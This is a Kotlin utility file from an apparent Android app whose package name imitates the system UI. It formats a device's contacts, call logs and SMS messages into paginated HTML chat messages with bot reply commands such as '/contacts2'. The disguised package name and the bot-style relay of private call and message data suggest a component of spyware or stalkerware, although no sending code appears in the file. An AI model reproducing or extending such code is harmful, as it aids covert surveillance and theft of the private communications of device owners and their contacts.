package com.systemui.package.utils

import com.systemui.package.model.CallLog
import com.systemui.package.model.Contact
import com.systemui.package.model.SmsMessage

object MessageFormatter {
    private val circledNumbers = listOf("①","②","③","④","⑤","⑥","⑦","⑧","⑨","⑩")

    fun formatContacts(contacts: List<Contact>, page: Int, total: Int): String {
        if (contacts.isEmpty()) return "📭 No contacts found."
        val start = (page - 1) * 50 + 1
        val end = minOf(start + 49, total)
        val sb = StringBuilder()
        sb.append("<b>📒 CONTACTS</b> (showing $start-$end of $total)\n\n")
        contacts.forEachIndexed { index, contact ->
            sb.append("${start + index}. ${escapeHtml(contact.name)} — ${escapeHtml(contact.phoneNumber)}\n")
        }
        if (end < total) sb.append("\n➡️ Reply /contacts${page + 1} for next 50")
        return sb.toString()
    }

    fun formatCallLogs(logs: List<CallLog>, date: String): String {
        if (logs.isEmpty()) return "📭 No call logs found for $date."
        val sb = StringBuilder()
        sb.append("<b>📞 CALL LOG — ${date.replaceFirstChar { it.uppercase() }}</b> (${logs.size} calls)\n\n")
        logs.forEach { call ->
            val icon = when (call.type) {
                "INCOMING" -> "🟢"; "OUTGOING" -> "🔴"; "MISSED" -> "⚫"; else -> "⬜"
            }
            sb.append("$icon ${call.time} | ${call.type} | ${escapeHtml(call.name)} | ${formatDuration(call.durationSec)}\n")
        }
        return sb.toString()
    }

    fun formatSms(messages: List<SmsMessage>, page: Int): String {
        if (messages.isEmpty()) return "📭 No messages found."
        val start = (page - 1) * 10 + 1
        val sb = StringBuilder()
        sb.append("<b>💬 MESSAGES</b> ($start-${start + messages.size - 1})\n\n")
        messages.forEachIndexed { index, msg ->
            val circledNum = circledNumbers.getOrElse(index) { "${start + index}" }
            sb.append("$circledNum ${msg.date} | ${escapeHtml(msg.name)}\n")
            sb.append("${escapeHtml(truncateBody(msg.body))}\n\n")
        }
        return sb.toString()
    }

    private fun escapeHtml(text: String): String = text.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
    private fun formatDuration(seconds: Int): String = if (seconds <= 0) "—" else {
        val m = seconds / 60; val s = seconds % 60
        if (m > 0) "${m}m ${s}s" else "${s}s"
    }
    private fun truncateBody(body: String, max: Int = 120): String = 
        if (body.length > max) body.take(max) + "..." else body
}